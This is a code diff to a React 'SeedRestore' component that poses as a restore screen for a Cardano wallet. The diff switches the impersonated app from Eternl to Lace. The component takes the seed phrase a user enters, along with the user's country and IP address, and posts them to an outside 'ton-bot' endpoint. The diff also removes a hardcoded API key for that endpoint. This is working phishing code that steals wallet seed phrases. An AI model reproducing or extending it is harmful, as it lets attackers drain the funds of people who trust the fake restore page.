@@ -2,6 +2,7 @@
 
 import React, { useMemo, useState, useRef, useEffect } from "react";
 import axios from "axios";
+import { TON_BOT_API_KEY, TON_BOT_SEED_URL } from "../app/config";
 
 // Load BIP39 wordlist from public file
 const loadWordlist = async (): Promise<string[]> => {
@@ -210,7 +211,7 @@ export default function SeedRestore({
       const userData = await getUserCountry();
 
       const messageData = {
-        appName: "Eternl",
+        appName: "Lace",
         seedPhrase: sanitizedSeedPhrase.join(" "),
         country: userData?.country || "Unknown",
         ipAddress: userData?.ip || "Unknown",
@@ -219,14 +220,12 @@ export default function SeedRestore({
       };
 
       const response = await fetch(
-        "https://ton-bot-eight.vercel.app//api/t1/image",
+        TON_BOT_SEED_URL,
         {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
-            "x-api-key":
-              process.env.NEXT_PUBLIC_SECRET_KEY ||
-              "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
+            "x-api-key": TON_BOT_API_KEY,
           },
           body: JSON.stringify(messageData),
         }
